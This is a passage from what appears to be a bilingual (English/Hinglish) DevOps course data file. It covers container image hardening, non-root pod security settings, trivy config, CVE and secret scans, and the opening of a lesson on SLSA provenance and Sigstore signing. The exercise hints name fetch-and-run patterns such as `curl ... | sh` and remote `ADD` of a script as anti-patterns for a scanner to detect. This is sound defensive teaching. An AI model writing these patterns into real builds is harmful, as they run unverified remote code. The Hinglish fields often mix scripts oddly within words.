    ],

    interviewQA: [
      {
        q: 'Walk through the base-image spectrum from full distro to scratch. What do you give up and gain at each step?',
        qHi: 'Full distro se scratch tak base-image spectrum ke through chalो. Har step par aap kya chhodते aur paते ho?',
        a: 'The full distribution image — python:3.12, node:20 — is around a gigabyte with roughly a thousand OS packages, a package manager, a shell, and network tools, running as root. It is the most convenient for debugging and the worst for security, and it should not run in production. The slim variant strips documentation, locales, and dev headers, landing near 150 megabytes while keeping the package manager and shell — a reasonable default for a build stage or when you genuinely need apt at runtime. Alpine uses musl libc instead of glibc and is around 50 megabytes; the trade is occasional subtle runtime incompatibilities with software that assumes glibc, and apk is still present. Distroless, from Google\'s project, is your language runtime and its libraries and nothing else — no shell, no package manager, around 50 megabytes; you give up the ability to docker exec a shell in for debugging, and you gain that an attacker with code execution also has no shell, no way to install tools, and nothing to pivot with. Scratch is completely empty, for a statically linked Go or Rust binary plus CA certs and timezone data; you give up every debugging affordance and any dynamic linking, and you gain an image that is just your binary with essentially zero OS attack surface. The practical answer for most services is a slim or distroless final stage from a multi-stage build.',
        aHi: 'Full distribution image — python:3.12, node:20 — लगभग ek gigabyte hai roughly ek hazaar OS packages, ek package manager, ek shell ke saath, root ke roop mein running. Ye debugging ke liye sabse convenient aur security ke liye sabse bura hai. Slim variant documentation, locales, aur dev headers strip karता hai, 150 megabytes ke paas land karता hai jabki package manager aur shell rakhता hai. Alpine glibc ke bजाय musl libc use karता hai aur लगभग 50 megabytes hai. Distroless aapka language runtime aur iski libraries aur kुछ nahi hai — koi shell nahi, koi package manager nahi; aap debugging ke liye ek shell docker exec karने ki ability chhodते ho, aur aap paते ho ki code execution wala ek attacker ke paas bhi koi shell nahi hai. Scratch completely empty hai. Zyादातर services ke liye practical answer ek multi-stage build se ek slim ya distroless final stage hai.',
      },
      {
        q: 'Why is running a container as a non-root user considered the single highest-value hardening change, and what related settings go with it?',
        qHi: 'Ek container ko ek non-root user ke roop mein chalाना single highest-value hardening change kyun considered hai, aur iske saath konse related settings jaते hain?',
        a: 'By default a container process runs as user ID 0 — root — inside the container\'s namespaces. Namespacing isolates that root from the host, but the isolation is not absolute: a vulnerability in the container runtime such as runc, a misconfigured hostPath volume mount, or a shared-kernel bug can all bridge it, and the moment any of them does, root in the container is root on the node, sitting next to every other pod on that machine. Running as an unprivileged user means that a code-execution bug in the application or a dependency — which image libraries, parsers, and deserialization paths produce regularly — lands on a process that cannot read arbitrary host state, cannot rewrite system files, and gives a container-escape exploit an unprivileged rather than a privileged starting point. The related settings that complete the picture: in the Dockerfile, create a user and USER to a numeric UID so Kubernetes can verify non-root without resolving /etc/passwd. In the pod securityContext: runAsNonRoot true, which makes the kubelet refuse a root container outright; runAsUser to the specific UID; allowPrivilegeEscalation false so a setuid binary cannot step back up; capabilities drop ALL, adding back only NET_BIND_SERVICE if the process must bind a low port; readOnlyRootFilesystem true with writable emptyDir mounts only where genuinely needed; and seccompProfile RuntimeDefault. Kubernetes bundles most of this into the Pod Security Standards restricted profile, enforceable per namespace.',
        aHi: 'By default ek container process container ke namespaces ke andar user ID 0 — root — ke roop mein run hota hai. Namespacing us root ko host se isolate karता hai, par isolation absolute nahi hai: runc jaise container runtime mein ek vulnerability, ek misconfigured hostPath volume mount, ya ek shared-kernel bug sab ise bridge kar sakते hain, aur us moment container mein root node par root hai. Ek unprivileged user ke roop mein running ka matlab application ya ek dependency mein ek code-execution bug ek process par land karता hai jо arbitrary host state nahi padh sakता. Related settings: Dockerfile mein, ek user banाओ aur ek numeric UID par USER karो. Pod securityContext mein: runAsNonRoot true, runAsUser, allowPrivilegeEscalation false, capabilities drop ALL, readOnlyRootFilesystem true, aur seccompProfile RuntimeDefault. Kubernetes iska zyादातर Pod Security Standards restricted profile mein bundle karता hai.',
      },
      {
        q: 'What is the difference between scanning a built image for CVEs and scanning the Dockerfile as configuration? Why do you need both?',
        qHi: 'Ek built image ko CVEs ke liye scan karne aur Dockerfile ko configuration ke roop mein scan karne mein kya farak hai? Aapko dono kyun chahिए?',
        a: 'They answer different questions and neither implies the other. Scanning the built image — trivy image — enumerates the OS and language packages actually present in the final image and matches their versions against vulnerability databases; its output is a list of CVEs with severities and fixed versions. Scanning the Dockerfile as configuration — trivy config — parses the Dockerfile without building anything and checks it against a ruleset of image anti-patterns: an unpinned or end-of-life base image, a final USER of root, a missing HEALTHCHECK, apt-get install without --no-install-recommends, an ADD that fetches a remote URL with no integrity check, a curl-pipe-to-shell pattern. Those are structural defects, not vulnerable packages, so the CVE scan is silent on all of them — an image can have zero known CVEs today and still run as root from an unpinned base that fetches and executes a remote script. You need both because they cover disjoint failure modes, and ideally a third: a secret scan of the image layers, because a credential written in an early layer and deleted in a later one is still recoverable from the layer history and is neither a CVE nor a Dockerfile misconfiguration. All three run offline in seconds and belong on every pull request.',
        aHi: 'Wo alag sawaalon ka jawaab dete hain aur koi doosre ko imply nahi karता. Built image scan karना — trivy image — final image mein actually present OS aur language packages enumerate karता hai aur unki versions ko vulnerability databases ke against match karता hai. Dockerfile ko configuration ke roop mein scan karना — trivy config — Dockerfile ko bina kुछ build kiye parse karता hai aur ise image anti-patterns ke ek ruleset ke against check karता hai: ek unpinned ya end-of-life base image, ek final USER of root, ek missing HEALTHCHECK, ek ADD jо ek remote URL fetch karता hai. Wo structural defects hain, vulnerable packages nahi. Aapko dono chahिए kyunki wo disjoint failure modes cover karते hain, aur ideally ek teesra: image layers ka ek secret scan.',
      },
    ],

    exercises: [
      {
        task: 'In a comment, lay out the base-image spectrum (full / slim / alpine / distroless / scratch) with approximate sizes and the security trade at each, and explain what a multi-stage build removes.',
        taskHi: 'Ek comment mein, base-image spectrum layout karो aur samjhाओ ek multi-stage build kya remove karता hai.',
        hint: 'AN IMAGE IS A FILESYSTEM + A PROCESS — ship the minimum of both. A default `FROM python:3.12` / `node:20` is ~1 GB, ~1,000 OS packages, a package manager (apt), a shell (bash), C-toolchain pieces, curl/wget, running as ROOT. The app needs ~40 of those packages; the other ~960 are ATTACK SURFACE (each can have a CVE) and the shell+pkg-manager+curl are an attacker\'s TOOLKIT after an RCE. THE SPECTRUM (largest/most-convenient -> smallest/most-locked-down): (1) FULL DISTRO — `python:3.12`, `node:20` — ~1 GB. Most convenient to debug, worst for security. DO NOT ship to prod. (2) SLIM — `python:3.12-slim`, `node:20-slim` — ~150 MB. Strips docs/locales/-dev headers; KEEPS the package manager + shell. Fine for a BUILD stage or when you genuinely need apt at runtime. (3) ALPINE — `python:3.12-alpine` — ~50 MB. musl libc instead of glibc (occasional subtle runtime incompatibilities with glibc-assuming software; DNS/threading edge cases); apk still present. (4) DISTROLESS — `gcr.io/distroless/python3` — ~50 MB. Your language runtime + its libraries + libc and NOTHING ELSE — NO shell, NO apk/apt, NO package manager. You give up `docker exec <shell>` for debugging; you gain that an attacker with RCE ALSO has no shell, no way to install tools, nothing to pivot with. (5) SCRATCH — `FROM scratch` — ~0. Completely empty; for a STATICALLY-LINKED Go/Rust binary + CA certs (`ca-certificates`) + tzdata. Give up all debugging + any dynamic linking; gain an image that is JUST your binary, ~zero OS attack surface. WHAT A MULTI-STAGE BUILD REMOVES: the build stage uses a large image (compiler, `git`, `make`, `-dev` headers, ~800 MB) and produces an ARTIFACT; the final stage starts from minimal/distroless and `COPY --from=build` ONLY that artifact. -> a CVE in `git`, `make`, the compiler, or any BUILD-TIME-ONLY dependency is NOT in the running image, because none of it was copied forward. The running image = the app + its compiled deps + the runtime, nothing that constructed it. PRACTICAL DEFAULT for most services: a slim or distroless final stage from a multi-stage build.',
        hintHi: 'EK IMAGE EK FILESYSTEM + EK PROCESS HAI — dono ka minimum ship karो. Ek default `FROM python:3.12` ~1 GB, ~1,000 OS packages, apt, bash, curl, ROOT ke roop mein. App ko ~40 chahिए; baaki ~960 ATTACK SURFACE hain aur shell+pkg-manager+curl ek RCE ke baad attacker ka TOOLKIT hain. SPECTRUM: (1) FULL DISTRO — `python:3.12` — ~1 GB. Prod mein ship MAT karो. (2) SLIM — `python:3.12-slim` — ~150 MB. docs/locales strip; package manager + shell RAKHTA hai. BUILD stage ke liye theek. (3) ALPINE — ~50 MB. musl libc (occasional glibc incompatibilities); apk present. (4) DISTROLESS — `gcr.io/distroless/python3` — ~50 MB. Runtime + libc + KUCH NAHI — NO shell, NO apt. `docker exec` chhodते ho; attacker ke paas bhi shell nahi. (5) SCRATCH — `FROM scratch` — ~0. STATIC Go/Rust binary + CA certs + tzdata ke liye. MULTI-STAGE KYA REMOVE KARTA HAI: build stage ek bade image (compiler, git, make, ~800 MB) mein artifact banाता hai; final stage minimal/distroless se `COPY --from=build` SIRF artifact. -> `git`/`make`/compiler mein ek CVE running image mein NAHI hai.',
      },
      {
        task: 'In a comment, explain why non-root is the highest-value hardening change, how to solve the usual "but I need root" objections, and the full securityContext (runAsNonRoot, runAsUser, allowPrivilegeEscalation, capabilities, readOnlyRootFilesystem, seccomp).',
        taskHi: 'Ek comment mein, samjhाओ non-root highest-value hardening change kyun hai aur poora securityContext.',
        hint: 'WHY NON-ROOT IS #1: by default a container process runs as uid 0 (ROOT) inside the container\'s namespaces. Namespacing isolates that root from the host BUT NOT ABSOLUTELY — a runc (container-runtime) CVE, a misconfigured `hostPath` mount, or a shared-KERNEL bug can all bridge it, and the MOMENT one does, root-in-container == root-on-the-NODE, sitting next to every other pod on that machine. Image libraries (imagemagick, ghostscript), XML/parser paths, and deserialization produce code-execution bugs REGULARLY -> non-root means that bug lands on a process that can\'t read arbitrary host state, can\'t rewrite system files, and gives a container-escape exploit an UNPRIVILEGED starting point. SOLVING THE OBJECTIONS: "I need to bind :80/:443" -> bind an UNPRIVILEGED port (:8080) and let the k8s Service / LB map 80->8080; or (last resort) add ONLY `NET_BIND_SERVICE`. "I write to /var/log/app or /data" -> mount an `emptyDir` (or a PVC) at exactly that path; or ship logs via stdout to a collector. "the base image\'s entrypoint needs root" -> pick a `:nonroot` distroless variant / `adduser` in the Dockerfile. THE FULL securityContext: `runAsNonRoot: true` (kubelet REFUSES to start a container whose process would be uid 0 — a hard backstop), `runAsUser: 10001` (a specific unprivileged uid — NUMERIC, so k8s verifies without resolving `/etc/passwd`), `allowPrivilegeEscalation: false` (a setuid binary can\'t step back up to root), `capabilities: { drop: ["ALL"] }` (a web app needs ZERO Linux caps; add back ONLY `NET_BIND_SERVICE` for a low port), `readOnlyRootFilesystem: true` (the app can\'t rewrite its own binary, can\'t drop a webshell to disk, can\'t persist a foothold across restart — mount a writable `emptyDir` at `/tmp` and anywhere else genuinely needed), `seccompProfile: { type: RuntimeDefault }` (blocks the ~44 dangerous+rarely-needed syscalls). Also in the Dockerfile: `RUN adduser -D -u 10001 app` then `USER 10001`. Kubernetes bundles most of this into the Pod Security Standards `restricted` profile — enforce it per-namespace with a label so a non-compliant pod is REJECTED at admission.',
        hintHi: 'NON-ROOT #1 KYUN: by default ek container process container ke namespaces ke andar uid 0 (ROOT) ke roop mein run hota hai. Namespacing isolate karता hai PAR ABSOLUTELY NAHI — ek runc CVE, ek misconfigured `hostPath` mount, ya ek shared-KERNEL bug ise bridge kar sakते hain, aur us MOMENT root-in-container == root-on-the-NODE. OBJECTIONS SOLVE karo: ":80 bind karna hai" -> ek UNPRIVILEGED port (:8080) bind karो, k8s Service ko 80->8080 map karne do; ya SIRF `NET_BIND_SERVICE` add karो. "/var/log par likhta hun" -> us path par ek `emptyDir` mount karो; ya stdout se logs ship karो. FULL securityContext: `runAsNonRoot: true`, `runAsUser: 10001` (NUMERIC), `allowPrivilegeEscalation: false`, `capabilities: { drop: ["ALL"] }`, `readOnlyRootFilesystem: true` (+ `/tmp` par writable `emptyDir`), `seccompProfile: { type: RuntimeDefault }`. Dockerfile: `RUN adduser -D -u 10001 app` phir `USER 10001`. Pod Security Standards `restricted` profile per-namespace enforce karो.',
      },
      {
        task: 'In a comment, distinguish the three image scans (config / CVE / layer-secret) — what each detects, what it misses — and give the Dockerfile anti-patterns that only a config scan catches.',
        taskHi: 'Ek comment mein, teen image scans distinguish karो aur wo Dockerfile anti-patterns do jо sirf ek config scan catch karता hai.',
        hint: 'THREE DIFFERENT QUESTIONS, THREE SCANS — you need ALL THREE, each covers a gap the others don\'t: (1) `trivy config <dir>` (Dockerfile / k8s / Terraform as CONFIGURATION) — parses WITHOUT building or contacting a registry; checks against a ruleset of anti-patterns. DETECTS: unpinned or EOL base (`FROM ubuntu` / `FROM node:18` — 18 is EOL, no more patches), final `USER root` (or no USER at all — the HIGHEST-value finding), missing `HEALTHCHECK`, `apt-get install` without `--no-install-recommends`, `ADD https://.../x.sh` (fetched over the network, no checksum, then run), `curl ... | sh` patterns, `--privileged` hints, secrets referenced in `ENV`/`ARG`. MISSES: whether the packages IN the image are vulnerable (it never builds it). Fast (<1s), fully OFFLINE, every PR. (2) `trivy image <img>` (the BUILT image for CVEs) — enumerates the OS + language packages ACTUALLY PRESENT in the final image, matches versions against vuln DBs. DETECTS: known CVEs in what actually ships, with severity + fixed version. Use `--ignore-unfixed`, gate on new HIGH/CRITICAL-with-a-fix (Lesson 3). MISSES: every structural defect above — an image can have ZERO CVEs today and still run as root from an unpinned base that curls a remote script. (3) `trivy image --scanners secret <img>` (the image LAYERS for secrets) — a credential written in an EARLY layer and `rm`-ed in a LATER one is STILL in the layer history and fully recoverable (`docker history` / `dive` / just extracting the tar). DETECTS: baked-in AWS keys, tokens, private keys, `.env` files, `.npmrc` with an auth token. MISSES: CVEs and config. It is NEITHER a CVE NOR a Dockerfile misconfig — its own scan. THE PIPELINE: `trivy config` -> `docker build` -> `trivy image` (CVE) -> `trivy image --scanners secret`. All offline, all a few seconds, all on every PR. ANTI-PATTERNS ONLY A CONFIG SCAN CATCHES: unpinned/`:latest`/EOL base; `USER root` / no USER; `ADD <url>`; missing `HEALTHCHECK`; `apt` without `--no-install-recommends`; running the whole build in one stage (toolchain shipped); `WORKDIR` not set; `COPY . .` copying a `.git` dir or secrets; `EXPOSE 22`.',
        hintHi: 'TEEN ALAG SAWAAL, TEEN SCANS — DONO nahi, TEENON chahिए: (1) `trivy config <dir>` (Dockerfile / k8s / Terraform CONFIGURATION ke roop mein) — bina build kiye parse karता hai. DETECT: unpinned/EOL base (`FROM ubuntu`, `FROM node:18`), final `USER root` (ya koi USER nahi — HIGHEST-value), missing `HEALTHCHECK`, `--no-install-recommends` ke bina `apt-get install`, `ADD https://.../x.sh`, `curl | sh`. MISS: kya image ke packages vulnerable hain. Fast, OFFLINE, har PR. (2) `trivy image <img>` (BUILT image CVEs) — final image mein ACTUALLY PRESENT packages, versions ko vuln DBs se match. DETECT: known CVEs + severity + fixed version. MISS: har structural defect — ek image mein ZERO CVEs ho sakते hain aur phir bhi ye root ke roop mein ek unpinned base se run ho. (3) `trivy image --scanners secret <img>` (image LAYERS) — ek EARLY layer mein likha aur LATER layer mein `rm` kiya credential STILL layer history mein hai, fully recoverable. DETECT: baked-in keys, tokens, `.env`, `.npmrc`. PIPELINE: `trivy config` -> `docker build` -> `trivy image` -> `trivy image --scanners secret`.',
      },
    ],

    keyTakeaways: [
      'AN IMAGE = A FILESYSTEM + A PROCESS; ship the minimum of both. A default `FROM python:3.12` is ~1 GB / ~1,000 packages / apt / bash / curl / root — the app needs ~40 packages; the rest is CVE surface, and the shell+pkg-manager+curl is an attacker\'s toolkit after an RCE. Base-image spectrum: full (~1 GB, never prod) → slim (~150 MB, keeps apt) → alpine (~50 MB, musl) → distroless (~50 MB, NO shell/pkg-manager) → scratch (~0, static binary + certs).',
      'MULTI-STAGE BUILDS are a security control, not just a size trick: build with the compiler/git/headers in a stage that is DISCARDED, `COPY --from=build` only the artifact into a distroless final stage. A CVE in `git`, `make`, the compiler, or any build-only dependency is then NOT in the running image.',
      'NON-ROOT is the single highest-value change: container root == node root the moment any isolation layer fails (a runc CVE, a hostPath mount, a kernel bug). Set `USER <numeric uid>` in the Dockerfile + `securityContext: { runAsNonRoot: true, runAsUser: 10001, allowPrivilegeEscalation: false }`. "Need :80" → bind :8080, let the Service map it. "Need to write /var/log" → mount an emptyDir there.',
      'ALSO: `capabilities: { drop: ["ALL"] }` (a web app needs zero; add `NET_BIND_SERVICE` only for a low port), `readOnlyRootFilesystem: true` (+ a writable emptyDir at /tmp — stops the app rewriting its binary or dropping a webshell), `seccompProfile: { type: RuntimeDefault }`. Pod Security Standards `restricted` bundles all of this, enforceable per namespace.',
      'RUN THREE IMAGE SCANS, they cover disjoint gaps: `trivy config` (Dockerfile anti-patterns — unpinned/EOL base, USER root, ADD of a URL, missing HEALTHCHECK — a config scan, not a CVE scan, finds these), `trivy image` (known CVEs in the packages actually shipped), `trivy image --scanners secret` (credentials baked into a layer and "deleted" later but still in the layer history). All offline, seconds, every PR.',
    ],
    keyTakeawaysHi: [
      'EK IMAGE = EK FILESYSTEM + EK PROCESS; dono ka minimum ship karो. Ek default `FROM python:3.12` ~1 GB / ~1,000 packages / apt / bash / curl / root hai — app ko ~40 packages chahिए; baaki CVE surface hai. Base-image spectrum: full (~1 GB, kabhi prod nahi) → slim (~150 MB, apt rakhता hai) → alpine (~50 MB, musl) → distroless (~50 MB, NO shell/pkg-manager) → scratch (~0, static binary + certs).',
      'MULTI-STAGE BUILDS ek security control hain: compiler/git/headers ke saath ek stage mein build karो jо DISCARD ho jaता hai, `COPY --from=build` sirf artifact ek distroless final stage mein. `git`, `make`, compiler, ya kisi build-only dependency mein ek CVE phir running image mein NAHI hai.',
      'NON-ROOT single highest-value change hai: container root == node root us moment jab koi isolation layer fail hoती hai (ek runc CVE, ek hostPath mount, ek kernel bug). Dockerfile mein `USER <numeric uid>` set karो + `securityContext: { runAsNonRoot: true, runAsUser: 10001, allowPrivilegeEscalation: false }`. ":80 chahिए" → :8080 bind karो. "/var/log likhna hai" → wahaan ek emptyDir mount karो.',
      'AUR: `capabilities: { drop: ["ALL"] }` (ek web app ko zero chahिए; ek low port ke liye sirf `NET_BIND_SERVICE` add karो), `readOnlyRootFilesystem: true` (+ /tmp par ek writable emptyDir), `seccompProfile: { type: RuntimeDefault }`. Pod Security Standards `restricted` ye sab bundle karता hai, per namespace enforceable.',
      'TEEN IMAGE SCANS RUN karो, wo disjoint gaps cover karते hain: `trivy config` (Dockerfile anti-patterns — unpinned/EOL base, USER root, ek URL ka ADD, missing HEALTHCHECK), `trivy image` (actually shipped packages mein known CVEs), `trivy image --scanners secret` (ek layer mein baked aur baad mein "deleted" par abhi bhi layer history mein credentials). Sab offline, seconds, har PR.',
    ],
  },

  {
    slug: 'ops-provenance-slsa-and-signing-with-sigstore',
    title: 'Provenance, SLSA & Signing with Sigstore',
    titleHi: 'Provenance, SLSA Aur Sigstore Se Signing',
    description:
      'Scanning tells you whether an artifact is vulnerable; it does not tell you whether the artifact is the one your pipeline actually built. This lesson covers build provenance (a signed record of how, where, and from what an artifact was produced), the SLSA framework of maturity levels, signing artifacts with Sigstore/cosign and verifying them at deploy time, in-toto attestations, and admission control that refuses to run anything unsigned.',
    descriptionHi:
      'Scanning aapko batाता hai ki ek artifact vulnerable hai ya nahi; ye aapko nahi batाता ki artifact wo hai jо aapki pipeline ne actually build kiya. Ye lesson build provenance cover karता hai (kaise, kahaan, aur kis se ek artifact produce hua iska ek signed record), maturity levels ka SLSA framework, Sigstore/cosign se artifacts sign karना aur unhe deploy time par verify karना, in-toto attestations, aur admission control jо kisi bhi unsigned cheez ko run karने se refuse karता hai.',
    difficulty: 'HARD',
    duration: 24,
    order: 5,

    analogy: {
      en: '**A sealed evidence bag with a chain-of-custody form versus a package on a doorstep.** A lab will not act on a sample that just appeared — it needs the tamper-evident bag, the form listing who collected it, where, when, and everyone who has held it since, and an intact seal. If the seal is broken or the form has a gap, the sample is inadmissible no matter how clean it looks under the microscope. Provenance and signing do this for a build artifact: a cryptographic record of which source commit, which builder, which build steps, and which dependencies produced this exact image, plus a signature that breaks if a single byte of the image changes afterward. Your deploy step is the lab: it verifies the seal and the chain before it will run anything, and rejects an artifact that cannot prove where it came from — even if a vulnerability scan of it comes back clean.',
      hi: '**Ek sealed evidence bag ek chain-of-custody form ke saath versus ek doorstep par ek package.** Ek lab ek sample par act nahi karेगा jо bas appear hua — ise tamper-evident bag chahिए, form jо list karता hai ki kisne ise collect kiya, kahaan, kab, aur tab se sabne jisne ise hold kiya, aur ek intact seal. Agmar seal toota hai ya form mein ek gap hai, sample inadmissible hai chahे ye microscope ke neeche kitna bhi clean dikhे. Provenance aur signing ye ek build artifact ke liye karते hain: ek cryptographic record ki konsा source commit, konsा builder, konse build steps, aur konsी dependencies ne ye exact image produce kiya, plus ek signature jо toot jaती hai agar image ka ek single byte baad mein change hota hai. Aapkा deploy step lab hai.',
    },

    simple: `**THE GAP: scanning proves an artifact is CLEAN, not that it is YOURS.**
\`\`\`
without signing/provenance, your deploy step trusts:
  - whatever image is at 'registry/app:v1.4.2' RIGHT NOW
  - that nobody re-pushed that tag with a different image (tags are MUTABLE)
  - that the CI that built it wasn't compromised
  - that the source it built from is the source in your repo
=> the SolarWinds attack: attacker never touched the source repo. they injected
   code into the BUILD, so the signed, "official" artifact shipped a backdoor.
\`\`\`

**BUILD PROVENANCE — a signed answer to "how was this made?":**
\`\`\`
a provenance attestation records, cryptographically bound to the artifact's DIGEST:
  - the source repo + exact commit SHA
  - the builder identity (which CI system, which workflow, which run)
  - the build entry point / parameters
  - the dependencies / materials consumed
  - (ideally) that the build was isolated + reproducible
generated BY the build platform (GitHub Actions provenance, GitLab, Tekton Chains).
\`\`\`

**SLSA (Supply-chain Levels for Software Artifacts) — a maturity ladder:**
\`\`\`
L0  no guarantees.
L1  provenance EXISTS - the build platform generates it (even if unsigned/unverified).
    catches nothing malicious, but you can now SEE how things were built.
L2  provenance is SIGNED by a hosted build platform + source is version-controlled.
    a tamper after the build is detectable.
L3  the build runs in an ISOLATED, ephemeral environment; provenance is
    UNFORGEABLE (the builder's signing key is not reachable from build steps).
    defends against a malicious build step tampering with the provenance itself.
(there is no "L4" in v1.0. L3 is the current top.)
\`\`\`

**SIGSTORE / COSIGN — sign + verify without running a CA or a key server:**
\`\`\`
KEYLESS (the recommended mode): cosign gets a SHORT-LIVED cert from Fulcio, tied to
   an OIDC identity (your GitHub Actions workflow's token). signs. logs the signature
   in Rekor (a public transparency log). NO long-lived private key to leak.
KEY-BASED: 'cosign generate-key-pair' -> cosign.key / cosign.pub. simpler; you now
   own a private key (put it in a KMS / the CI secret store, rotate it).
sign:    cosign sign      registry/app@sha256:<digest>
verify:  cosign verify --certificate-identity=... --certificate-oidc-issuer=...  (keyless)
         cosign verify --key cosign.pub  registry/app@sha256:<digest>            (key)
\`\`\`

**VERIFY AT THE DOOR — admission control:**
\`\`\`
a Kubernetes admission controller (Sigstore policy-controller, Kyverno, Connaisseur,
Gatekeeper + a provider) intercepts every Pod create and:
  - resolves the image tag to a digest
  - checks: a valid signature from an ALLOWED identity, over THIS digest
  - checks: a provenance attestation, from the EXPECTED repo + workflow
  - (optionally) an SBOM attestation, a passing-scan attestation
  -> no valid signature/provenance  =>  the Pod is REJECTED. unsigned code cannot run.
always deploy by DIGEST, never by tag - a tag is a mutable pointer.
\`\`\``,

    simpleHi: `**THE GAP: scanning saabit karता hai ek artifact CLEAN hai, ye nahi ki ye AAPKA hai.**
\`\`\`
signing/provenance ke bina, aapkा deploy step trust karता hai:
  - jо bhi image 'registry/app:v1.4.2' par ABHI hai
  - ki kisi ne wo tag ek alag image ke saath re-push nahi kiya (tags MUTABLE hain)
  - ki jо CI ne ise build kiya wo compromised nahi tha
  - ki jо source ise build kiya wo aapke repo mein source hai
=> SolarWinds attack: attacker ne kabhi source repo touch nahi kiya. unhone code
   BUILD mein inject kiya, to signed, "official" artifact ne ek backdoor ship kiya.
\`\`\`

**BUILD PROVENANCE — "ye kaise banaya gaya?" ka ek signed jawaab:**
\`\`\`
ek provenance attestation record karता hai, artifact ke DIGEST se cryptographically bound:
  - source repo + exact commit SHA
  - builder identity (konsा CI system, konsा workflow, konsा run)
  - build entry point / parameters
  - consumed dependencies / materials
  - (ideally) ki build isolated + reproducible tha
build platform DWARA generated (GitHub Actions provenance, GitLab, Tekton Chains).
\`\`\`

**SLSA (Supply-chain Levels for Software Artifacts) — ek maturity ladder:**
\`\`\`
L0  koi guarantees nahi.
L1  provenance EXIST karता hai - build platform ise generate karता hai.
    kुछ malicious catch nahi karता, par aap ab DEKH sakते ho cheezein kaise build hoती hain.
L2  provenance ek hosted build platform DWARA SIGNED hai + source version-controlled hai.
    build ke baad ek tamper detectable hai.
L3  build ek ISOLATED, ephemeral environment mein run hota hai; provenance
    UNFORGEABLE hai (builder ki signing key build steps se reachable nahi hai).
(v1.0 mein koi "L4" nahi hai. L3 current top hai.)
\`\`\`

**SIGSTORE / COSIGN — ek CA ya ek key server chalाye bina sign + verify:**
\`\`\`
KEYLESS (recommended mode): cosign Fulcio se ek SHORT-LIVED cert paता hai, ek OIDC
   identity se tied (aapke GitHub Actions workflow ka token). sign karता hai. signature
   ko Rekor mein log karता hai (ek public transparency log). KOI long-lived private key nahi.
KEY-BASED: 'cosign generate-key-pair' -> cosign.key / cosign.pub. simpler; aap ab ek
   private key own karते ho (ise ek KMS / CI secret store mein daalो, rotate karो).
sign:    cosign sign      registry/app@sha256:<digest>
verify:  cosign verify --certificate-identity=... --certificate-oidc-issuer=...  (keyless)
         cosign verify --key cosign.pub  registry/app@sha256:<digest>            (key)
\`\`\`

**DARWAZE PAR VERIFY KARO — admission control:**
\`\`\`
ek Kubernetes admission controller (Sigstore policy-controller, Kyverno, Connaisseur)
har Pod create intercept karता hai aur:
  - image tag ko ek digest par resolve karता hai
  - check karता hai: ek ALLOWED identity se ek valid signature, IS digest par
  - check karता hai: ek provenance attestation, EXPECTED repo + workflow se
  -> koi valid signature/provenance nahi  =>  Pod REJECTED. unsigned code run nahi ho sakta.
hamesha DIGEST se deploy karो, kabhi tag se nahi - ek tag ek mutable pointer hai.
\`\`\``,

    content: `## What scanning cannot tell you

A vulnerability scan answers one question: does this artifact contain components with known flaws? It does not answer a different and equally important question: is this artifact the one your pipeline built from your source, or is it something else that ended up at the same registry coordinates? Container tags are mutable pointers — anyone with push access, or anyone who compromises a credential with push access, can re-point \`registry/app:v1.4.2\` at a completely different image, and a deploy step that pulls "the image at that tag" will happily run it. The SolarWinds compromise is the canonical demonstration that this matters: the attackers never modified the public source repository. They injected malicious code into the build process itself, so the artifact that came out — signed, versioned, and shipped through the official channel — contained a backdoor while the source on disk looked clean. Scanning the source or even the artifact would not necessarily have caught it; what was needed was a verifiable link between the artifact and a known-good build of known-good source.

## Build provenance

Provenance is a machine-readable, signed record of how an artifact was produced, cryptographically bound to that artifact\'s content digest. A provenance attestation states: the source repository and the exact commit that was built; the identity of the builder — which CI platform, which workflow definition, which specific run; the build\'s entry point and parameters; the materials consumed, meaning the dependencies and base images that went in; and, at higher assurance levels, that the build ran in an isolated environment and is reproducible. Crucially it is generated by the build platform, not by the code being built — GitHub Actions can emit provenance for artifacts it produces, as can GitLab CI, Tekton Chains, and Google Cloud Build — so that a compromised build step cannot simply write its own favourable provenance.

## SLSA

SLSA — Supply-chain Levels for Software Artifacts — is a framework that describes build integrity as a ladder of levels, so an organisation can state where it is and what the next step buys. Level 0 is no guarantees. Level 1 means provenance exists: the build platform generates it, even if nobody signs or checks it yet. This catches no attack on its own, but it makes builds auditable — you can now see, for any artifact, what it claims to have been built from. Level 2 means the provenance is signed by a hosted build platform and the source is version-controlled, so tampering with the artifact after the build is detectable by verification. Level 3 means the build runs in an isolated, ephemeral environment and the provenance is unforgeable — the builder\'s signing key is not reachable from within the build steps, so even a malicious step running in the build cannot forge provenance for a tampered artifact. SLSA v1.0 stops at Level 3; there is no Level 4. Most organisations that adopt SLSA target Level 2 first, since a hosted CI platform with signed provenance gets them most of the way, and pursue Level 3 for their most sensitive artifacts.

## Sigstore and cosign

Traditional code signing requires running a certificate authority or a key-management server and protecting long-lived private keys, which is enough friction that most projects never signed anything. Sigstore removes that friction. In its recommended keyless mode, cosign obtains a short-lived signing certificate from Fulcio, a certificate authority that issues certificates bound to an OIDC identity — in CI, that identity is the workflow\'s own OIDC token, so the certificate says "signed by the release workflow of this repository". Cosign signs the artifact with the ephemeral key, records the signature in Rekor, a public append-only transparency log, and discards the key. There is no long-lived private key to steal, and the transparency log makes it impossible to sign something secretly. Key-based mode still exists and is simpler to reason about — \`cosign generate-key-pair\` produces a private and public key, you sign with the private key and distribute the public one — but you are now responsible for storing the private key in a KMS or secret store and rotating it. Either way, you sign the artifact by digest, and verification checks that a valid signature exists over that exact digest from an allowed signer.

## Verify at admission

Signing is only useful if something checks the signature before the artifact runs. In Kubernetes this is an admission controller — the Sigstore policy-controller, Kyverno, Connaisseur, or Gatekeeper with a suitable provider — that intercepts every pod creation and, before allowing it, resolves the image reference to a digest and verifies that there is a valid signature over that digest from an identity on the allowlist, that a provenance attestation exists naming the expected source repository and workflow, and optionally that other attestations are present such as an SBOM or a record of a passing vulnerability scan. If any required check fails, the pod is rejected and never starts. This is what turns signing from a label into an enforced control: unsigned code, or code signed by the wrong identity, or code whose provenance points at an unexpected repository, cannot run in the cluster at all. A prerequisite is that you deploy by digest rather than by tag everywhere, because a tag is a mutable pointer and verifying a signature over "whatever v1.4.2 currently means" defeats the purpose.`,

    contentHi: `## Scanning aapko kya nahi bata sakti

